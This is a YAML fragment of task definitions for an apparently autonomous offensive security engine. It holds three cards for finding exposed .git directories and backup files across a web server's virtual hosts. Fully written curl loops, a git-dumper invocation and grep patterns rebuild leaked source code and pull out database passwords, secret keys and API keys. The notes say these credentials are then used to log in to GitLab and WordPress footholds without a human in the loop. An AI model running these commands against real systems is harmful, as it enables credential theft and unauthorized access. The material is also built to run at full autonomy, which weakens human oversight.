  notes: 'deterministic recon: fingerprints the app on EACH grounded name-based vhost (Server header + meta-generator + common CMS/app signatures) in one sweep, so the engine learns what runs on dev/support/dnsadmin/ir/status/tracking/vpn (not just the default vhost). Per-vhost app lines land in raw for content-tier extraction (like drupal_version=9). Feeds app-specific exploit-card selection.'
- id: git-exposure-vhost-sweep
  name: Exposed .git dir sweep across all vhosts (source/cred leak lead)
  phase: enum
  tier: floor
  autonomy: full
  when:
  - service: http
  tool: curl
  invocation: 'for h in {{vhosts}}; do for p in /.git/HEAD /.git/config; do code=$(curl -s -m 8 -o /dev/null -w ''%{http_code}'' -H "Host: $h" "http://{{host}}:{{port}}$p"); body=$(curl -s -m 8 -H "Host: $h" "http://{{host}}:{{port}}$p" | head -c 160 | tr ''\n'' '' ''); echo "VHOST $h $p -> $code $body"; done; done 2>&1 || true

    '
  parallel_safe: true
  blast_radius: low
  operator: ''
  confirms:
  - endpoint
  verify:
    success_if: stdout matches 'ref:.refs/|repositoryformatversion|\[core\]'
    emits:
    - git_leak_vhost
    capture:
      git_leak_vhost: VHOST (\S+) /\.git/(?:HEAD|config) -> 200
  cost_hint: moderate
  notes: "dev-leak pre-stage (cred hunt): checks /.git/HEAD + /.git/config on EVERY grounded vhost, not just the default \u2014 the exposed repo could be on dev/support/etc. success_if requires real git content (ref: refs / repositoryformatversion / [core]) so a soft-404 cannot phantom-ground. capture surfaces git_leak_vhost=<host> so the goal can be aimed there; then git-dumper the tree for creds -> auto-unlock gitlab/wordpress via the cred parser."
- id: git-dumper-leaked-vhost-creds
  name: Dump exposed .git repo on the leaking vhost and grep reconstructed source for creds
  phase: exploit
  tier: standard
  autonomy: full
  when:
  - service: http
  tool: git-dumper
  invocation: 'rm -rf {{output_dir}}; /opt/bs2/tools/venv/bin/git-dumper -q -H "Host={{git_leak_vhost}}" "http://{{host}}:{{port}}/.git/" {{output_dir}} 2>&1 | tail -3; grep -rniE "DB_PASSWORD|DB_PASS=|secret_key_base|api[_-]?key|password[[:space:]]*[=:]|password.{0,6}=>|@[a-z0-9._-]+/[a-z0-9._-]+\.git" {{output_dir}} 2>/dev/null | grep -viE "example|placeholder|your[_-]?pass|changeme|xxxxx|TODO|test123" | head -30 || true

    '
  parallel_safe: true
  blast_radius: low
  operator: ''
  confirms:
  - cred
  verify:
    success_if: stdout matches 'DB_PASSWORD|secret_key_base|api[_-]?key|password.{0,8}(=>|=|:)'
    emits:
    - cred
  cost_hint: moderate
  notes: 'Gated by {{git_leak_vhost}} (from git-exposure-vhost-sweep) -> STAGES until a real .git is proven exposed, no phantom dumps. Reconstructs the repo content-blind via git-dumper (-H Host=<leak vhost> so it hits the IP as the right vhost), then greps the working tree (wp-config.php/settings.php/.env/ database.yml/git-remote-with-embedded-creds) for secrets. emit cred is proof-guarded (scrubbed to key; value never surfaces to the manager). SEAM: the raw cred lines in stdout are for the content-tier extractor to re-emit as <svc>_cred=user:pass, which the bridge cred parser then consumes to auto-unlock the gitlab/wordpress authed footholds. git-dumper installed at gunbelt/tools/venv (absent from base PATH).'
- id: backup-archive-across-vhosts
  name: Backup/archive leak sweep across all vhosts (source + DB dump lead)
  phase: enum
  tier: floor
  autonomy: full
  when:
  - service: http
  tool: curl
  invocation: 'for h in {{vhosts}}; do for f in backup.zip backup.tar.gz backup.tar.bz2 backup.tar backup.sql db.sql dump.sql database.sql site.tar.gz www.zip web.zip html.zip backup.7z backup.rar wp-config.php.bak config.php.bak settings.php.bak .env.bak database.yml.bak; do read code ctype clen < <(curl -s -m 8 -I -H "Host: $h" "http://{{host}}:{{port}}/$f" | awk ''BEGIN{IGNORECASE=1} /^HTTP/{c=$2} /^Content-Type:/{t=$2} /^Content-Length:/{l=$2} END{print c, t, l}''); if [ "$code" = "200" ]; then echo "BACKUP $h /$f -> 200 ctype=$ctype len=$clen"; fi; done; done 2>&1 || true

    '
  parallel_safe: true
  blast_radius: low
  operator: ''
  confirms:
  - endpoint
  verify:
    success_if: stdout matches 'BACKUP .* ctype=(application|binary|octet|x-)'
    emits:
    - endpoint
    capture:
      backup_lead: BACKUP (\S+ /\S+) -> 200
  cost_hint: moderate
  notes: 'Fire-on-vhosts pre-stage: HEADs a curated backup/archive name list on EVERY grounded vhost. success_if requires an archive-ish Content-Type (application/binary/octet/x-*) so a soft-200 (text/html catch-all) cannot phantom-ground a lead. capture surfaces backup_lead=<host /path> so the goal can pull + inspect the archive for source/creds. HEAD-only (no download) keeps blast radius low; the download + content extraction is a follow-up once a lead grounds.'
